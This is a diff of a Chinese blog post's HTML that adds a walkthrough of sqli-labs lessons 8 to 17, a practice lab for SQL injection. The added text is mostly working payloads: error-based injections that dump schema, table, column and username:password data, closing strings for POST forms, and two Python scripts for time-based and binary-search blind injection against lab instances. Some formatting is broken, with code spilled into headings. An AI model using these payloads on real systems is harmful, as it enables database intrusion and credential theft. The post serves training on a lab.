@@ -88,12 +88,12 @@
 
 
 
-<meta name="description" content="sqli-labs的通关之路">
+<meta name="description" content="sqli-labs的爬坑笔记">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs">
 <meta property="og:url" content="http://example.com/2021/07/06/sqli-labs/index.html">
 <meta property="og:site_name" content="Co1a&#39;s Blog">
-<meta property="og:description" content="sqli-labs的通关之路">
+<meta property="og:description" content="sqli-labs的爬坑笔记">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBc7b2005ed18471c1ecf8c5cfe3523227?method=download&shareKey=d2acd16cbf9a174eaffcd75ac156f1ba">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBf48be6f3020f800e055af6db1cbecf62?method=download&shareKey=0a23d63a3112a7cc570fb46b039af8e4">
@@ -113,8 +113,13 @@
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBed24153dae05a8d9f089e60942e27282?method=download&shareKey=9ca0ee00dff3bb7bfb2687b1bcdeaf8d">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB78c1e3ffd2e333d7e047301f1e2bf85b?method=download&shareKey=1efa4d15642f7ebe1c93a30baca3c52b">
 <meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBb12d84d820c43a3c460061f5152116ba?method=download&shareKey=3dc5c85f2d4994656be393b797ca6bfe">
+<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB28db885b746b7da711126ccfcf51b721?method=download&shareKey=031d5cc725ee92930581147769dd6ed6">
+<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEBb8cd58c431594b8391abebe595043775?method=download&shareKey=b0b8d7f450628f733224e183bc8ef61b">
+<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB5c9b271573eedc4b8c23a5ded43c95f3?method=download&shareKey=15f0d990caec7e7c278badc704fed939">
+<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB6ae0d639c0f1b5d7ac236ec8893a7026?method=download&shareKey=37f4ae5f1f1f885fe0caf731024a07c3">
+<meta property="og:image" content="https://note.youdao.com/yws/api/personal/file/WEB3df45b0d957f198a20436e41a47872b7?method=download&shareKey=917bd8322c126858b2d0d9cc0086e334">
 <meta property="article:published_time" content="2021-07-06T03:49:49.000Z">
-<meta property="article:modified_time" content="2021-07-13T08:51:00.612Z">
+<meta property="article:modified_time" content="2021-07-19T06:03:34.763Z">
 <meta property="article:author" content="Co1a">
 <meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
@@ -401,7 +406,7 @@
 
           
               <div class="post-description">
-                  sqli-labs的通关之路
+                  sqli-labs的爬坑笔记
               </div>
           
 
@@ -504,6 +509,142 @@
 <p>把一句话来写入文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.32.137:8888/Less-7/?id=1&#x27;))union select 1,2,&#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &quot;/var/www/html/Less-7/php_info.php&quot;--+</span><br></pre></td></tr></table></figure>
 <p><img src="https://note.youdao.com/yws/api/personal/file/WEBb12d84d820c43a3c460061f5152116ba?method=download&shareKey=3dc5c85f2d4994656be393b797ca6bfe" alt="Less-7"><br>通过访问发现文件成功写入，也可以写入一句话木马，用蚁剑连接<br>也可以使用盲注</p>
+<hr>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>构造如下语句进行闭合，用盲注进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cf6b4809-433f-4c4a-b2ba-585f9e36fe56.node4.buuoj.cn/Less-8/?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>无论是单引号还是双引号闭合，页面回显是一样的<br>根据题目用单引号进行闭合，用时间盲注进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bbd45ede-8ffd-4049-acb8-0ee2a4cd83df.node4.buuoj.cn/Less-9/?id=1&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>跟Less-9，页面回显是一样的<br>根据题目用双引号进行闭合，用时间盲注进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bbd45ede-8ffd-4049-acb8-0ee2a4cd83df.node4.buuoj.cn/Less-10/?id=1&quot;--+</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><h4 id="一般注入"><a href="#一般注入" class="headerlink" title="一般注入"></a>一般注入</h4><p>是post提交数据进行注入，查询语句与Less-1类似。要注意的是查询时只有两列，不是三列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27;order by 3#</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB28db885b746b7da711126ccfcf51b721?method=download&shareKey=031d5cc725ee92930581147769dd6ed6" alt="Less-11"></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ol>
+<li>爆所有库<br>updatexml一次只能显示32个字符，没有显示完全的可以通过mid来显示剩下的字符</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; or updatexml(0,concat(0x7e,(mid((select group_concat(schema_name) from information_schema.schemata),1,30)),0x7e),1)#</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEBb8cd58c431594b8391abebe595043775?method=download&shareKey=b0b8d7f450628f733224e183bc8ef61b" alt="Less-11"><br>2. 爆表  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; or updatexml(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB5c9b271573eedc4b8c23a5ded43c95f3?method=download&shareKey=15f0d990caec7e7c278badc704fed939" alt="Less-11">  </p>
+<ol start="3">
+<li>爆列名  </li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; or updatexml(0,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB6ae0d639c0f1b5d7ac236ec8893a7026?method=download&shareKey=37f4ae5f1f1f885fe0caf731024a07c3" alt="Less-11">  </p>
+<ol start="4">
+<li>爆字段  </li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; or updatexml(0,concat(0x7e,mid((select group_concat(username,&#x27;:&#x27;,password) from security.users),1,30),0x7e),1)#</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/api/personal/file/WEB3df45b0d957f198a20436e41a47872b7?method=download&shareKey=917bd8322c126858b2d0d9cc0086e334" alt="Less-11"></p>
+<hr>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><h4 id="一般注入-1"><a href="#一般注入-1" class="headerlink" title="一般注入"></a>一般注入</h4><p>跟Less-11一样，是post提交数据进行注入，查询语句与Less-1类似。查询时只有两列，闭合语句如下（用双引号，括号，注释符进行闭合）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&quot;)order by 2#</span><br></pre></td></tr></table></figure>
+
+<h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h4><ol>
+<li>爆所有库  </li>
+</ol>
+<p>一次性显示不下，用limit依次显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uname=1&quot;) or extractvalue(0,concat(0x7e,(select concat(schema_name) from information_schema.schemata limit 0,1),0x7e))#</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">![Less-12](https://note.youdao.com/yws/api/personal/file/WEB855ae09fcbfca3ad0f2e7f5a2bde9a7e?method=download&amp;shareKey=4561eb26f8692edaae2f8ddce98b807f)</span><br><span class="line"></span><br><span class="line">2. 爆表  </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+<p>uname=1”) or extractvalue(0,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),0x7e))#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![Less-12](https://note.youdao.com/yws/api/personal/file/WEB73ad8e9ff0db606cbdcc64afa7aa2e08?method=download&amp;shareKey=d7846bb60474fef215f18c67b4ac0f21)</span><br><span class="line"></span><br><span class="line">3. 爆列名  </span><br></pre></td></tr></table></figure>
+<p>uname=1”) or extractvalue(0,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name =’users’ ),0x7e))#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![Less-12](https://note.youdao.com/yws/api/personal/file/WEB93feb1792fe2d01cc6622644cc045174?method=download&amp;shareKey=4dc6529f0933f0a4ef956ec7bf0c01c1)</span><br><span class="line"></span><br><span class="line">4. 爆字段  </span><br><span class="line">用limit分段显示</span><br></pre></td></tr></table></figure>
+<p>uname=1”) or extractvalue(0,concat(0x7e,(select concat(username,’:’,password) from security.users limit 0,1),0x7e))#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![Less-12](https://note.youdao.com/yws/api/personal/file/WEBc42af1f755757b0699ad99ef3d5676f7?method=download&amp;shareKey=47d1ebf04db80b6bf5bbb4bfdff93f1b)</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### Less-13  </span><br><span class="line">构造如下语句进行闭合，构造查询语句跟Less-11一样</span><br></pre></td></tr></table></figure>
+<p>uname=1’)#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### Less-14  </span><br><span class="line">构造如下语句进行闭合，构造查询语句跟Less-11一样</span><br></pre></td></tr></table></figure>
+<p>uname=1”#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### Less-15  </span><br><span class="line">使用脚本进行盲注，脚本注入速度较慢，有一定的错误，需要多尝试几次  </span><br><span class="line">**1. 时间盲注**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>import string<br>import requests<br>import datetime<br>from tqdm import tqdm</p>
+<p>def request(data):<br>    try:<br>        requests.post(“<a target="_blank" rel="noopener" href="http://da91b82f-53d8-462e-b676-289439e88fdf.node4.buuoj.cn/Less-15/&quot;,data=data">http://da91b82f-53d8-462e-b676-289439e88fdf.node4.buuoj.cn/Less-15/&quot;,data=data</a>,<br>                     timeout=3)<br>    except:<br>        return True<br>    return False</p>
+<p>#查询的语句<br>sql = “select database()”</p>
+<h1 id="sql-“select-group-concat-distinct-TABLE-SCHEMA-from-information-schema-tables”"><a href="#sql-“select-group-concat-distinct-TABLE-SCHEMA-from-information-schema-tables”" class="headerlink" title="sql = “select group_concat(distinct TABLE_SCHEMA) from information_schema.tables”"></a>sql = “select group_concat(distinct TABLE_SCHEMA) from information_schema.tables”</h1><h1 id="sql-“select-group-concat-distinct-TABLE-NAME-from-information-schema-tables-where-TABLE-SCHEMA-‘security’”"><a href="#sql-“select-group-concat-distinct-TABLE-NAME-from-information-schema-tables-where-TABLE-SCHEMA-‘security’”" class="headerlink" title="sql = “select group_concat(distinct TABLE_NAME) from information_schema.tables where TABLE_SCHEMA = ‘security’”"></a>sql = “select group_concat(distinct TABLE_NAME) from information_schema.tables where TABLE_SCHEMA = ‘security’”</h1><h1 id="sql-“select-group-concat-distinct-COLUMN-NAME-from-information-schema-columns-where-TABLE-SCHEMA-’security’-and-TABLE-NAME-’users’”"><a href="#sql-“select-group-concat-distinct-COLUMN-NAME-from-information-schema-columns-where-TABLE-SCHEMA-’security’-and-TABLE-NAME-’users’”" class="headerlink" title="sql = “select group_concat(distinct COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA =’security’ and TABLE_NAME=’users’”"></a>sql = “select group_concat(distinct COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA =’security’ and TABLE_NAME=’users’”</h1><h1 id="sql-“select-group-concat-distinct-username-’-’-password-from-security-users”"><a href="#sql-“select-group-concat-distinct-username-’-’-password-from-security-users”" class="headerlink" title="sql = “select group_concat(distinct username,’:’,password) from security.users”"></a>sql = “select group_concat(distinct username,’:’,password) from security.users”</h1><p>out_len_sql = “admin’ and if(length(({}))={},sleep(5),1)#”<br>out_sql = “admin’ and if(substring(({}),{},1)=’{}’,sleep(5),1)#”</p>
+<h1 id="获取结果长度"><a href="#获取结果长度" class="headerlink" title="获取结果长度"></a>获取结果长度</h1><p>length = 1<br>while True:<br>    data = {“uname”: “%s” % out_len_sql.format(sql, length), “passwd”: “admin”, “submit”: “Submit”}<br>    if (request(data)):<br>        break<br>    length += 1<br>print(“长度：{}”.format(length))</p>
+<p>result = “”<br>for i in tqdm(range(1, length + 1)):<br>    for j in string.printable:<br>        data = {“uname”: “%s” % out_sql.format(sql, i, j), “passwd”: “admin”, “submit”: “Submit”}<br>        if request(data):<br>            result += j<br>            break</p>
+<p>print(“结果：{}”.format(result))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**2. 二分法**</span><br></pre></td></tr></table></figure>
+<p>import string<br>import requests<br>import time<br>from tqdm import tqdm</p>
+<p>def request(data):<br>    try:<br>        r = requests.post(“<a target="_blank" rel="noopener" href="http://da91b82f-53d8-462e-b676-289439e88fdf.node4.buuoj.cn/Less-15/&quot;">http://da91b82f-53d8-462e-b676-289439e88fdf.node4.buuoj.cn/Less-15/&quot;</a>, data=data)<br>        time.sleep(0.5)<br>        if ‘flag’ in r.text:<br>            return True<br>    except:<br>        return True<br>    return False<br>#查询的语句</p>
+<h1 id="sql-“select-basedir”"><a href="#sql-“select-basedir”" class="headerlink" title="sql = “select @@basedir”"></a>sql = “select @@basedir”</h1><p>sql = “select database()”</p>
+<h1 id="sql-“select-group-concat-distinct-SCHEMA-NAME-from-information-schema-schemata”"><a href="#sql-“select-group-concat-distinct-SCHEMA-NAME-from-information-schema-schemata”" class="headerlink" title="sql = “select group_concat(distinct SCHEMA_NAME) from information_schema.schemata”"></a>sql = “select group_concat(distinct SCHEMA_NAME) from information_schema.schemata”</h1><h1 id="sql-“select-group-concat-distinct-TABLE-NAME-from-information-schema-tables-where-TABLE-SCHEMA-‘security’”-1"><a href="#sql-“select-group-concat-distinct-TABLE-NAME-from-information-schema-tables-where-TABLE-SCHEMA-‘security’”-1" class="headerlink" title="sql = “select group_concat(distinct TABLE_NAME) from information_schema.tables where TABLE_SCHEMA = ‘security’”"></a>sql = “select group_concat(distinct TABLE_NAME) from information_schema.tables where TABLE_SCHEMA = ‘security’”</h1><h1 id="sql-“select-group-concat-distinct-COLUMN-NAME-from-information-schema-columns-where-TABLE-SCHEMA-’security’-and-TABLE-NAME-’users’”-1"><a href="#sql-“select-group-concat-distinct-COLUMN-NAME-from-information-schema-columns-where-TABLE-SCHEMA-’security’-and-TABLE-NAME-’users’”-1" class="headerlink" title="sql = “select group_concat(distinct COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA =’security’ and TABLE_NAME=’users’”"></a>sql = “select group_concat(distinct COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA =’security’ and TABLE_NAME=’users’”</h1><h1 id="sql-“select-group-concat-distinct-username-password-from-security-users”"><a href="#sql-“select-group-concat-distinct-username-password-from-security-users”" class="headerlink" title="sql = “select group_concat(distinct username,password) from security.users”"></a>sql = “select group_concat(distinct username,password) from security.users”</h1><p>out_len_sql = “admin’ and length(({}))={}#”<br>out_sql = “admin’ and substr(({}),{},1)&gt;’{}’#”</p>
+<h1 id="获取结果长度-1"><a href="#获取结果长度-1" class="headerlink" title="获取结果长度"></a>获取结果长度</h1><p>length = 1<br>while True:<br>    data = {“uname”: “%s” % out_len_sql.format(sql, length), “passwd”: “admin”, “submit”: “Submit”}<br>    if (request(data)):<br>        break<br>    length += 1<br>print(“长度：{}”.format(length))</p>
+<p>result = “”<br>for i in tqdm(range(1, length + 1)):<br>    low = 32<br>    high = 126<br>    while (low &lt; high):<br>        mid = (low + high) // 2<br>        data = {“uname”: “%s” % out_sql.format(sql, i, chr(mid)), “passwd”: “admin”, “submit”: “Submit”}<br>        if request(data):<br>            low = mid + 1<br>        else:<br>            high = mid<br>    result += chr(low)</p>
+<p>print(“结果：{}”.format(result.lower()))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### Less-16  </span><br><span class="line">构造如下语句进行闭合，查询方法语句跟Less-15一样，脚本注入</span><br></pre></td></tr></table></figure>
+<p>uname=admin”)or 1=1#</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">### Less-17</span><br><span class="line">构造如下语句进行闭合，由于会对uname进行check，所以从passwd注入，并且要输入存在的uname，使用报错注入，查询语句可参考Less-11</span><br></pre></td></tr></table></figure>
+<p>uname=admin&amp;passwd=admin’#&amp;submit=Submit</p>
+<pre><code>
+
+**未完待续**
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</code></pre>
 
       
     </div>
@@ -665,7 +806,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLi-LABS-Page-1-Basic-Challenges"><span class="nav-text">SQLi-LABS Page-1(Basic Challenges)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap%E4%BD%BF%E7%94%A8"><span class="nav-text">sqlmap使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%B3%A8%E5%85%A5"><span class="nav-text">直接注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">编写脚本注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6"><span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-7"><span class="nav-text">Less-7</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLi-LABS-Page-1-Basic-Challenges"><span class="nav-text">SQLi-LABS Page-1(Basic Challenges)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqlmap%E4%BD%BF%E7%94%A8"><span class="nav-text">sqlmap使用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-3"><span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-4"><span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-5"><span class="nav-text">Less-5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E6%B3%A8%E5%85%A5"><span class="nav-text">直接注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">编写脚本注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6"><span class="nav-text">Less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-7"><span class="nav-text">Less-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-8"><span class="nav-text">Less-8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-9"><span class="nav-text">Less-9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-10"><span class="nav-text">Less-10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-11"><span class="nav-text">Less-11</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%B3%A8%E5%85%A5"><span class="nav-text">一般注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text">报错注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-12"><span class="nav-text">Less-12</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E8%88%AC%E6%B3%A8%E5%85%A5-1"><span class="nav-text">一般注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-2"><span class="nav-text">报错注入</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-TABLE-SCHEMA-from-information-schema-tables%E2%80%9D"><span class="nav-text">sql &#x3D; “select group_concat(distinct TABLE_SCHEMA) from information_schema.tables”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-TABLE-NAME-from-information-schema-tables-where-TABLE-SCHEMA-%E2%80%98security%E2%80%99%E2%80%9D"><span class="nav-text">sql &#x3D; “select group_concat(distinct TABLE_NAME) from information_schema.tables where TABLE_SCHEMA &#x3D; ‘security’”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-COLUMN-NAME-from-information-schema-columns-where-TABLE-SCHEMA-%E2%80%99security%E2%80%99-and-TABLE-NAME-%E2%80%99users%E2%80%99%E2%80%9D"><span class="nav-text">sql &#x3D; “select group_concat(distinct COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA &#x3D;’security’ and TABLE_NAME&#x3D;’users’”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-username-%E2%80%99-%E2%80%99-password-from-security-users%E2%80%9D"><span class="nav-text">sql &#x3D; “select group_concat(distinct username,’:’,password) from security.users”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%BB%93%E6%9E%9C%E9%95%BF%E5%BA%A6"><span class="nav-text">获取结果长度</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-basedir%E2%80%9D"><span class="nav-text">sql &#x3D; “select @@basedir”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-SCHEMA-NAME-from-information-schema-schemata%E2%80%9D"><span class="nav-text">sql &#x3D; “select group_concat(distinct SCHEMA_NAME) from information_schema.schemata”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-TABLE-NAME-from-information-schema-tables-where-TABLE-SCHEMA-%E2%80%98security%E2%80%99%E2%80%9D-1"><span class="nav-text">sql &#x3D; “select group_concat(distinct TABLE_NAME) from information_schema.tables where TABLE_SCHEMA &#x3D; ‘security’”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-COLUMN-NAME-from-information-schema-columns-where-TABLE-SCHEMA-%E2%80%99security%E2%80%99-and-TABLE-NAME-%E2%80%99users%E2%80%99%E2%80%9D-1"><span class="nav-text">sql &#x3D; “select group_concat(distinct COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA &#x3D;’security’ and TABLE_NAME&#x3D;’users’”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-%E2%80%9Cselect-group-concat-distinct-username-password-from-security-users%E2%80%9D"><span class="nav-text">sql &#x3D; “select group_concat(distinct username,password) from security.users”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%BB%93%E6%9E%9C%E9%95%BF%E5%BA%A6-1"><span class="nav-text">获取结果长度</span></a></div>
             
 
           </div>
@@ -1253,8 +1394,8 @@
         var result = document.execCommand('copy')
         document.body.removeChild(ta)
         
-          if(result)$(this).text('copy_success')
-          else $(this).text('copy_failure')
+          if(result)$(this).text('复制成功')
+          else $(this).text('复制失败')
         
         $(this).blur()
       })).on('mouseleave', function (e) {
